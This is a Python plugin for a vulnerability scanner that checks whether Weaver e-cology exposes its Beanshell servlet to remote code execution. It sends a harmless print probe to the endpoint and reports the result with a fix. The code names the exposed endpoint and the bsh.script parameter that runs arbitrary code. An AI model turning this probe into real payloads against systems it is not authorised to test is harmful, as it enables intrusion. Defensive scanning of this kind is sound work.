# 泛微 e-cology Beanshell 脚本执行 RCE
# 漏洞原因：/weaver/bsh.servlet.BshServlet 暴露 Beanshell 解释器，
#   攻击者可 POST bsh.script 执行任意 Java / Beanshell 代码。
# 本插件仅做存在性验证：POST print("probe") 无害探针，检测响应签名判定接口是否可达。
from plugins.base import PluginBase
from core.models import ScanResult, STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN
from lib.colors import ok, no
from lib.http import join_url

# 漏洞命中签名（与 lab/weaver_server.py vuln 模式一致）
BSH_MARKER = 'weaver-bsh-rce-confirmed'


class WeaverBshRcePlugin(PluginBase):
    name = '泛微 e-cology Beanshell 脚本执行 RCE'
    cve = ''
    severity = 'high'
    category = 'vuln'
    description = '/weaver/bsh.servlet.BshServlet 暴露 Beanshell 解释器，POST bsh.script 可执行任意代码'
    fix = '下线或禁用 BshServlet；Beanshell 解释器禁止对外暴露；接口强制鉴权'

    def verify(self, target, session):
        url = join_url(target, '/weaver/bsh.servlet.BshServlet')
        # 无害探针：print 一个字符串，不执行破坏性命令
        data = {'bsh.script': 'print("weaver-scan-probe");'}
        try:
            resp = session.post(url, data=data)
        except Exception as e:
            print(no('泛微 Beanshell RCE（网络异常）'))
            return ScanResult(kind='vuln', name=self.name, status=STATUS_UNKNOWN,
                              url=url, evidence=str(e))

        text = resp.text or ''
        if BSH_MARKER in text:
            print(ok('存在泛微 e-cology Beanshell 脚本执行 RCE'))
            return ScanResult(
                kind='vuln', name=self.name, severity=self.severity,
                status=STATUS_CONFIRMED, url=url,
                evidence=f'响应含 Beanshell RCE 特征：{BSH_MARKER}',
                fix=self.fix,
            )
        print(no('不存在泛微 e-cology Beanshell 脚本执行 RCE'))
        return ScanResult(kind='vuln', name=self.name, status=STATUS_SAFE, url=url,
                          evidence='响应未含 Beanshell RCE 特征（接口不可达或已修复）')
